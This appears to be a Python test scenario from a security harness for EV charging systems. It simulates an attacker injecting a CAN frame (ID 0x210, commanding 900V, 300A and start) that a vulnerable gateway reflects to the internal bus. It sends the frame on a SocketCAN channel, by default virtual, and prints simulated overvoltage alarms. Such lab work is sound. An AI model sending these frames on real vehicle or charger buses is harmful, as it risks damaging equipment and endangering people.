import threading
import time
import can
from infra.scenario_base import ScenarioHooks
from infra.config import CONFIG

class Scenario(ScenarioHooks):
    """
    Scenario 07: Harici CAN Yansıtma (Reflection)
    
    Simulates an attacker injecting a localized CAN frame (0x210) 
    which gets reflected by a vulnerable gateway to the internal bus.
    """
    _simulation_started = False

    def __init__(self):
        super().__init__()
        # Ensure we only start the background simulation once
        if not Scenario._simulation_started:
            Scenario._simulation_started = True
            self.start_background_simulation()

    def start_background_simulation(self):
        t = threading.Thread(target=self.run_simulation, daemon=True)
        t.start()

    def run_simulation(self):
        """
        Waits for the session to likely start, then performs the attack.
        """
        # Wait for the system to boot and start transactions
        time.sleep(3) 
        
        print("\n--- [SCENARIO 07] ATTACK SEQUENCE INITIATED ---")
        self.inject_attack()
        print("--- [SCENARIO 07] ATTACK SEQUENCE FINISHED ---\n")

    def inject_attack(self):
        # The malicious packet
        # CAN ID: 0x210 (Power Electronics Control)
        # Data: Voltage 900V, Current 300A, Start
        frame_id = 0x210
        data = [0x0F, 0xA0, 0x0C, 0x80, 0x00, 0x00, 0x00, 0x01]
        
        try:
            channel = CONFIG.get("vcan_channel", "vcan0")
            # Try to connect to real CAN bus (Linux/SocketCAN)
            bus = can.interface.Bus(channel=channel, interface="socketcan")
            
            msg = can.Message(
                arbitration_id=frame_id,
                data=data,
                is_extended_id=False
            )
            bus.send(msg)
            print(f"[ATTACKER] Injected CAN Frame ID: {hex(frame_id)} Data: {[hex(x) for x in data]} on {channel}")
            
            # Since we can't easily listen on the same socket without a loop in this architecture,
            # we simulate the "Gateway Reflection" and "Victim" response here conceptually.
            
            # Simulate Gateway Reflection
            print(f"[GATEWAY] VULNERABILITY: Anomaly detected? NO. Forwarding {hex(frame_id)} to INTERNAL bus.")
            
            # Simulate Victim (Power Electronics)
            print(f"[INTERNAL] POWER ELECTRONICS: Received Command {hex(frame_id)}. SET VOLTAGE 900V!")
            print(f"[INTERNAL] ALARM: CRITICAL OVERVOLTAGE!")

        except Exception as e:
            # Fallback for Windows or if vcan0 is missing
            print(f"[SIMULATION WARNING] Could not access CAN bus: {e}")
            print(f"[ATTACKER] (Virtual) Injected CAN Frame ID: {hex(frame_id)} Data: {[hex(x) for x in data]}")
            print(f"[GATEWAY] (Virtual) VULNERABILITY: Forwarding {hex(frame_id)} to INTERNAL bus.")
            print(f"[INTERNAL] (Virtual) POWER ELECTRONICS: SET VOLTAGE 900V! CRITICAL OVERVOLTAGE!")

    def pre_ocpp(self, action, payload):
        return action, payload

    def post_ocpp(self, action, payload, reply):
        return reply

    def pre_can(self, can_frame):
        return can_frame

    def post_can(self, can_frame):
        pass
